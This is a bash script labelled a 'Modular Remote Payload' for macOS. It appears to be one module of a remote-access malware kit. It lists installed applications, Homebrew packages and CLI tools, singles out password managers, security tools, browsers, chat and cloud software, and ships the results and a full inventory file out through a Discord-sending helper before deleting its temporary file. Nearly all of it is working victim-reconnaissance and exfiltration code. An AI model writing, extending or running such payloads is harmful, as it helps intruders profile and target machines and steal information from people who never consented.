#!/bin/bash
# ============================================================
# Installed Software for macOS - Modular Remote Payload
# ============================================================
# Lists installed applications and packages
# ============================================================

SYSID=$(get_sysid)
OUTPUT="📦 **Installed Software on $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

TMPFILE="/tmp/software_$SYSID.txt"
echo "Software Inventory - $SYSID" > "$TMPFILE"
echo "Generated: $(date)" >> "$TMPFILE"
echo "========================================" >> "$TMPFILE"

# Count applications
APP_COUNT=$(ls /Applications | wc -l | xargs)
OUTPUT+="**📊 SUMMARY**\n"
OUTPUT+="• Applications: \`$APP_COUNT\`\n"

# Homebrew packages
if command -v brew &>/dev/null; then
    BREW_COUNT=$(brew list | wc -l | xargs)
    OUTPUT+="• Homebrew packages: \`$BREW_COUNT\`\n"
fi
OUTPUT+="\n"

# List Applications
OUTPUT+="**📱 APPLICATIONS**\n"
echo -e "\n=== APPLICATIONS ===" >> "$TMPFILE"
ls /Applications | head -20 | while read app; do
    OUTPUT+="• \`$app\`\n"
    echo "$app" >> "$TMPFILE"
done
ls /Applications >> "$TMPFILE"
OUTPUT+="\n"

# Interesting software detection
OUTPUT+="**🔍 INTERESTING SOFTWARE**\n"

# Browsers
for app in "Safari" "Google Chrome" "Firefox" "Brave Browser" "Microsoft Edge"; do
    [[ -d "/Applications/$app.app" ]] && OUTPUT+="• Browser: \`$app\` ✅\n"
done

# Development
for app in "Xcode" "Visual Studio Code" "iTerm" "Docker" "Postman" "TablePlus"; do
    [[ -d "/Applications/$app.app" ]] && OUTPUT+="• Dev tool: \`$app\` ✅\n"
done

# Security
for app in "Wireshark" "Burp Suite" "1Password" "LastPass"; do
    [[ -d "/Applications/$app.app" ]] && OUTPUT+="• Security: \`$app\` ✅\n"
done

# Communication
for app in "Slack" "Discord" "Zoom" "Microsoft Teams" "Signal"; do
    [[ -d "/Applications/$app.app" ]] && OUTPUT+="• Communication: \`$app\` ✅\n"
done

# Cloud storage
for app in "Dropbox" "Google Drive" "OneDrive"; do
    [[ -d "/Applications/$app.app" ]] && OUTPUT+="• Cloud: \`$app\` ✅\n"
done

OUTPUT+="\n"

# Homebrew packages (if installed)
if command -v brew &>/dev/null; then
    OUTPUT+="**🍺 HOMEBREW**\n"
    echo -e "\n=== HOMEBREW PACKAGES ===" >> "$TMPFILE"
    brew list >> "$TMPFILE"
    brew list | head -15 | while read pkg; do
        OUTPUT+="• \`$pkg\`\n"
    done
fi

# CLI tools
OUTPUT+="\n**⚙️ CLI TOOLS**\n"
for tool in git python3 node npm ruby gem docker kubectl aws gcloud; do
    command -v $tool &>/dev/null && OUTPUT+="• \`$tool\` ✅\n"
done

send_discord "$OUTPUT" "$TMPFILE"
rm -f "$TMPFILE"

